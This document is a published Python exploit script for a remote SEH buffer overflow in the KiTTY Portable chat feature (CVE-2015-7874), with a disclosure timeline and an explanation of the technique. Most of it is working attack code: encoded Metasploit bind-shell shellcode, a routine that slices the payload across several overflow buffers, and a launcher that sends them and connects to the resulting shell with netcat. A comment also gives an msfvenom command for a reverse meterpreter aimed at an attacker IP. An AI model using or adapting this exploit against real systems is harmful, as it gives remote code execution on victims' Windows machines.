# Exploit Title: KiTTY Portable <= 0.65.0.2p Chat Remote Buffer Overflow (SEH WinXP/Win7/Win10)
# Date: 28/12/2015
# Exploit Author: Guillaume Kaddouch
#   Twitter: @gkweb76
#   Blog: http://networkfilter.blogspot.com
#   GitHub: https://github.com/gkweb76/exploits
# Vendor Homepage: http://www.9bis.net/kitty/
# Software Link: http://sourceforge.net/projects/portableapps/files/KiTTY%20Portable/KiTTYPortable_0.65.0.2_English.paf.exe
# Version: 0.65.0.2p
# Tested on: Windows XP SP3 x86 (FR), Windows 7 Pro x64 (FR), Windows 10 Pro x64 builds 10240/10586 (FR)
# CVE: CVE-2015-7874
# Category: Remote

"""
Disclosure Timeline:
--------------------
2015-09-13: Vulnerability discovered
2015-09-26: Vendor contacted
2015-09-28: Vendor answer
2015-10-09: KiTTY 0.65.0.3p released : unintentionally (vendor said) preventing exploit from working, without fixing the core vulnerability
2015-12-28: exploit published

Other KiTTY versions have been released since 0.65.0.3p, not related to this vulnerability. Vendor said he may release a version without chat in a future release,
while providing an external chat DLL as a separate download.

Description :
-------------
A remote overflow exists in the KiTTY Chat feature, which enables a remote attacker to execute code on the
vulnerable system with the rights of the current user, from Windows XP x86 to Windows 10 x64 included (builds 10240/10586).
Chat feature is not enabled by default.

WinXP -> Remote Code Execution
Win7  -> Remote Code Execution
Win10 -> Remote Code Execution

Instructions:
-------------
- Enable Chat feature in KiTTY portable (add "Chat=1" in kitty.ini)
- Start KiTTY on 127.0.0.1 port 1987 (Telnet)
- Run exploit from remote machine (Kali Linux is fine)

Exploitation:
-------------
When sending a long string to the KiTTY chat server as nickname, a crash occurs. The EIP overwrite does let little room
for exploitation (offset 54) with no more than 160 to 196 bytes for the shellcode from XP to Windows10. Using a Metasploit 
small shellcode such as windows/shell/reverse_ord_tcp (118 bytes encoded) makes KiTTY crashing after the first connection. 
We control the SEH overflow, but as all DLLs are SafeSEH protected, using an address from KiTTY itself has a NULL which 
forces us to jump backward with no extra space. We are jailed in a tight environment with little room to work with.

The trick here is to slice our wanted Metasploit bind shellcode in 3 parts (350 bytes total), and send them in 3 
successive buffers, each of them waiting in an infinite loop to not crash the process. Each buffer payload will copy 
its shellcode slice to a stable memory location which has enough room to place a bigger shellcode. The final buffer  
jumps to that destination memory location where our whole shellcode has been merged, to then proceed with decoding 
and execution. This exploit is generic, which means you can even swap the shellcode included with a 850 bytes one, 
and it will be sliced in as many buffers as necessary. This method should theoretically be usable for other 
exploits and vulnerabilities as well.

All KiTTY versions prior to 0.65.0.2p should be vulnerable, the only change is the SEH address for the POP POP RET. 
I have successfully exploited prior versions 0.63.2.2p and 0.62.1.2p using SEH addresses I have included as comment in the exploit.

Pro & Cons:
-----------
[+]: works from XP to Windows 10 as it uses addresses from the main executable
[+]: not affected by system DEP/ASLR/SafeSEH as the main executable is not protected
[+]: works even with small slice size below 50 bytes, instead of 118
[-]: each buffer sent consumes 100% of one CPU core. Sending many buffers can reach 100% of whole CPU depending on the 
CPU's core number. However even on a single core CPU, it is possible to send 9 buffers and run a shellcode successfully.
Also, for a bind shell payload, the connection is kept open even when closing the main program.
[-]: the destination memory address is derived from address of ECX at time of crash. To reuse this slice method on another 
vulnerability, it may be required to use another register, or even to use addresses available on stack instead at time of crash.

Graphical explanation:
---------------------

-------------------
-------------------
---- SHELLCODE ----
-------------------
-------------------

1) Shellcode Slicer -> slice[1]
					-> slice[2]
					-> slice[3]

2) Buffer Builder	-> buffer[1]: junk + padding + slice[1] + endmark + shell_copy + nseh + seh
					-> buffer[2]: junk + padding + slice[2] + endmark + shell_copy + nseh + seh
					-> buffer[3]: junk + padding + slice[3] + endmark + shell_copy + nseh + seh

															       TARGET CRASH AREA			    TARGET DST ADDR
																-----------------------	 shell_copy --------------
3) Slice Launcher	-> Sends buffer[1] ------------------------>| buffer[1] (thread1) |   ----->    |  slice[1]  | <-| 
					-> Sends buffer[2] ------------------------>| buffer[2] (thread2) |   ----->    |  slice[2]  |	 |
					-> Sends buffer[3] ------------------------>| buffer[3] (thread3) |   ----->    |  slice[3]  |   |
																-----------------------				--------------	 |
																				|									 |
																				|____________________________________|
																						jump to rebuilt shellcode

guillaume@kali64:~$ ./kitty_chat.py 10.0.0.52 win10

KiTTY Portable <= 0.65.0.2p Chat Remote Buffer Overflow (SEH WinXP/Win7/Win10)
[*] Connecting to 10.0.0.52
[*] Sending evil buffer1... (slice 1/3)
[*] Sending evil buffer2... (slice 2/3)
[*] Sending evil buffer3... (slice 3/3)

[*] Connecting to our shell...
(UNKNOWN) [10.0.0.52] 4444 (?) open
Microsoft Windows [version 10.0.10240]
(c) 2015 Microsoft Corporation. Tous droits reserves.

C:\kitty\App\KiTTY>

"""

import socket, os, time, sys, struct

print "\nKiTTY Portable <= 0.65.0.2p Chat Remote Buffer Overflow (SEH WinXP/Win7/Win10)"

if len(sys.argv) < 3:
        print "\nUsage: kitty_chat.py <IP> <winxp|win7|win10> [no_nc|local_nc]"
        print "Example: kitty_chat.py 192.168.135.130 win7"
        print "\n Optional argument:"
        print "- 'no_nc' (no netcat), prevents the exploit from starting netcat."
        print "Useful if you are using your own shellcode."
        print "- 'local_nc (local netcat), binds netcat on local port 4444."
        print "Useful if you are using a classic reverse shell shellcode."
        sys.exit()

host = sys.argv[1] # Remote target
win  = sys.argv[2] # OS

# If argument "no_nc" specified, do not start netcat at the end of the exploit
# If argument "local_nc" specified, bind netcat to local port 4444
# By default netcat will connect to remote host on port 4444 (default shellcode is a bind shell)
netcat = "remote"
if len(sys.argv) == 4:
        if   sys.argv[3] == "no_nc":
                netcat = "disabled"
        elif sys.argv[3] == "local_nc":
                netcat = "local"
        else:
                print "Unknown argument: %s" % sys.argv[3]
                sys.exit()

# Destination address, will be used to calculate dst addr copy from ECX + 0x0006EEC6
relative_jump = 0x112910E8      # = 0x0006EEC6 + 0x11222222     ; avoid NULLs
slice_size    = 118

# OS buffer alignement
# buffer length written to memory at time of crash
if   win == "win7":
        offset = 180
elif win == "win10":
        offset = 196
elif win == "winxp":
        offset = 160
        slice_size = 98         # buffer smaller on XP, slice size must be reduced
else:
        print "Unknown OS selected: %s" % win
        print "Please choose 'winxp', 'win7' or 'win10'"
        sys.exit()

# Shellcode choice: below is a Metasploit bind shell of 350 bytes. However I have tested successfully
# a Metasploit meterpreter reverse RC4 shell of 850 bytes (encoded with x86/alpha_mixed) on Windows XP where the buffer
# is the smallest. The shellcode was cut into 9 slices and worked perfectly :-) The same works of course
# for Windows 7 and Windows 10, where I tested successfully a Metasploit HTTPS reverse shell of 1178 bytes  
# (encoded with x86/alpha_mixed), which was cut into 10 slices. To generate such shellcode:
# msfvenom -p windows/meterpreter/reverse_https LHOST=YOUR_ATTACKER_IP LPORT=4444 -e x86/alpha_mixed -b '\x00\x0a\x0d\xff' -f c

# Metasploit Bind Shell 4444
# Encoder: x86/fnstenv_mov
# Bad chars: '\x00\x0a\x0d\xff'
# Size: 350 bytes
shellcode = (
"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0e\xf9"
"\xa7\x68\x83\xeb\xfc\xe2\xf4\xf2\x11\x25\x68\x0e\xf9\xc7\xe1"
"\xeb\xc8\x67\x0c\x85\xa9\x97\xe3\x5c\xf5\x2c\x3a\x1a\x72\xd5"
"\x40\x01\x4e\xed\x4e\x3f\x06\x0b\x54\x6f\x85\xa5\x44\x2e\x38"
"\x68\x65\x0f\x3e\x45\x9a\x5c\xae\x2c\x3a\x1e\x72\xed\x54\x85"
"\xb5\xb6\x10\xed\xb1\xa6\xb9\x5f\x72\xfe\x48\x0f\x2a\x2c\x21"
"\x16\x1a\x9d\x21\x85\xcd\x2c\x69\xd8\xc8\x58\xc4\xcf\x36\xaa"
"\x69\xc9\xc1\x47\x1d\xf8\xfa\xda\x90\x35\x84\x83\x1d\xea\xa1"
"\x2c\x30\x2a\xf8\x74\x0e\x85\xf5\xec\xe3\x56\xe5\xa6\xbb\x85"
"\xfd\x2c\x69\xde\x70\xe3\x4c\x2a\xa2\xfc\x09\x57\xa3\xf6\x97"
"\xee\xa6\xf8\x32\x85\xeb\x4c\xe5\x53\x91\x94\x5a\x0e\xf9\xcf"
"\x1f\x7d\xcb\xf8\x3c\x66\xb5\xd0\x4e\x09\x06\x72\xd0\x9e\xf8"
"\xa7\x68\x27\x3d\xf3\x38\x66\xd0\x27\x03\x0e\x06\x72\x02\x06"
"\xa0\xf7\x8a\xf3\xb9\xf7\x28\x5e\x91\x4d\x67\xd1\x19\x58\xbd"
"\x99\x91\xa5\x68\x1f\xa5\x2e\x8e\x64\xe9\xf1\x3f\x66\x3b\x7c"
"\x5f\x69\x06\x72\x3f\x66\x4e\x4e\x50\xf1\x06\x72\x3f\x66\x8d"
"\x4b\x53\xef\x06\x72\x3f\x99\x91\xd2\x06\x43\x98\x58\xbd\x66"
"\x9a\xca\x0c\x0e\x70\x44\x3f\x59\xae\x96\x9e\x64\xeb\xfe\x3e"
"\xec\x04\xc1\xaf\x4a\xdd\x9b\x69\x0f\x74\xe3\x4c\x1e\x3f\xa7"
"\x2c\x5a\xa9\xf1\x3e\x58\xbf\xf1\x26\x58\xaf\xf4\x3e\x66\x80"
"\x6b\x57\x88\x06\x72\xe1\xee\xb7\xf1\x2e\xf1\xc9\xcf\x60\x89"
"\xe4\xc7\x97\xdb\x42\x57\xdd\xac\xaf\xcf\xce\x9b\x44\x3a\x97"
"\xdb\xc5\xa1\x14\x04\x79\x5c\x88\x7b\xfc\x1c\x2f\x1d\x8b\xc8"
"\x02\x0e\xaa\x58\xbd"
)
# ###############################################################################
# ** Shellcode Slicer **
# ###############################################################################
# Slice our shellcode in as many parts as necessary
count      = 1
position   = 0
remaining  = len(shellcode)
slice      = []
total_size = 0

counter = 0
while position < len(shellcode):
        if remaining > (slice_size - 1):
                slice.append(shellcode[position:slice_size*count])
                position = slice_size * count
                remaining = len(shellcode) - position
                count += 1
        else: # last slice
                slice.append(shellcode[position:position+remaining] + '\x90' * (slice_size - remaining))
                position = len(shellcode)
                remaining = 0

                # If shellcode size is less than 256 bytes (\xFF), two slices only are required. However the jump
                # to shellcode being on 2 bytes, it would insert a NULL (e.g \xFE\x00). In this case we simply
                # add a NOP slice to keep this shellcode slicer generic.
                if len(shellcode) < 256:
                        slice.append('\x90' * slice_size)
                        total_size += slice_size

        # Keep track of whole slices size, which may be greater than original shellcode size
        # if padding is needed for the last slice. Will be used to calculate a jump size later
        total_size += len(slice[counter])

		
# ###############################################################################
# ** Buffer Builder **
# ###############################################################################
# Prepare as many buffers as we have shellcode slices
seh     = '\x36\x31\x4B\x00'               				# 0x004B3136 / POP POP RET / kitty_portable.exe 0.65.0.2p
#seh    = '\x43\x82\x4B\x00'                            # 0x004B8243 / POP POP RET / kitty_portable.exe 0.63.2.2p
#seh    = '\x0B\x34\x49\x00'                            # 0x0049340B / POP POP RET / kitty_portable.exe 0.62.1.2p
nseh    = '\x90' * 4            						# will be calculated later
junk    = '\x41' * 58
endmark = '\x43' * 5					   				# used to mark end of slice
buffer  = []

for index in range(len(slice)):
        # Slice end marker, to stop copy once reached   # mov edi,0x4343XXXX
        shellcode_end = '\xBF' + slice[index][slice_size-2:slice_size] + '\x43\x43'

        shell_copy = ( # 51 bytes
        # Calculate shellcode src & dst address
        '\x8B\x5C\x24\x08'                              # mov ebx,[esp+8]       ; retrieve nseh address
        )

        if index < (len(slice) - 1):
														# sub bl,0xB2           ; calculate shellcode position from nseh
                shell_copy += '\x80\xEB' + struct.pack("<B", slice_size + len(endmark) + 51 + len(nseh))            
        else: # last slice      
														# sub bl,0xB1           ; calculate shellcode position from nseh
                shell_copy += '\x80\xEB' + struct.pack("<B", slice_size + len(endmark) + 50 + len(nseh))            

		# In this exploit we retrieve an address from the main process memory, using ECX. This will be used below to calculate
        # shellcode destination. On other exploits, it may be necessary to use another register (or even to hardcode the address)
        shell_copy += (
        '\x89\xCE'                                      # mov esi,ecx           ; retrieve main process memory address
        '\x31\xC9'                                      # xor ecx,ecx           ; will store the increment
        )

        # Calculate shellcode destination relative to memory address retrieved above. As we ADD an address having NULLs
        # we store a non NULL address instead, that we SUB afterwards in the register itself
        if index > 0:                                   # add esi,0x1117FED7 (+118 * x)
                shell_copy += '\x81\xC6' + struct.pack("<I", relative_jump + (slice_size * index))
        else: # first slice
                shell_copy += '\x81\xC6' + struct.pack("<I", relative_jump)

        shell_copy += (
        '\x81\xEE\x22\x22\x22\x11'                      # sub esi,0x11222222    ; calculate shellcode destination
        )

        shell_copy += shellcode_end                     # mov edi,0x4343XXXX    ; shellcode end mark
		
		shell_copy += (
        # Shellcode copy loop
        '\x83\xC1\x04'                                  # add ecx, 0x4          ; increment counter
        '\x83\xC6\x04'                                  # add esi, 0x4          ; increment destination
        '\x8B\x14\x0B'                                  # mov edx,[ebx+ecx]     ; put shell chunk into edx
        '\x89\x16'                                      # mov [esi],edx         ; copy shell chunk to destination
        '\x39\xFA'                                      # cmp edx,edi           ; check if we reached shellcode end mark (if yes set ZF = 1)
        '\x75\xF1'                                      # jne short -13         ; if ZF = 0, jump back to increment ecx
        )

        if index < (len(slice) - 1):
                shell_copy += ( # infinite loop
                '\x90\x90\x90\x90'                      # nop nop nop nop       ; infinite loop
                '\xEB\xFA\x90\x90'                      # jmp short -0x4        ; infinite loop
                )
        else: # last slice
                                                        # sub si,0x160          ; prepare jump address: sub len(slices)
                shell_copy += '\x66\x81\xEE' + struct.pack("<H", total_size - 2)

                shell_copy += (
                '\x56'                                  # push esi              ; store full shellcode address on stack
                '\xC3'                                  # ret                   ; jump to shellcode (we cannot us JMP or CALL as \xFF is a bad char)
                )
														# jmp short -len(shell_copy)
		nseh    = '\xEB' + struct.pack("<B", 254 - len(shell_copy)) + '\x90\x90'
        padding = '\x42' * (offset - len(slice[index]) - len(endmark) - len(shell_copy))
		
        buffer.append(junk + padding + slice[index] + endmark + shell_copy + nseh + seh)

		
# ###############################################################################
# ** Slice Launcher **
# ###############################################################################
# Send all of our buffers to the target!
sock = []
print "[*] Connecting to %s" % host
for index in range(len(buffer)):
        sock.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        try:
                sock[index].connect((host, 1987))
                time.sleep(1)
                print "[*] Sending evil buffer%d... (slice %d/%d)" % (index+1, index+1, len(buffer))
                sock[index].send(buffer[index])
                time.sleep(1)
                sock[index].close()
                time.sleep(2)

                if index == (len(buffer) - 1):
                        if   netcat == "disabled":
                                print "[*] Done."
                        elif netcat == "local":
                                print "\n[*] Waiting for our shell!"
                                os.system("nc -nlvp 4444")
                        elif netcat == "remote": # default
                                print "\n[*] Connecting to our shell..."
                                time.sleep(2)
                                os.system("nc -nv " + host + " 4444")
        except:
                print "[-] Error sending buffer"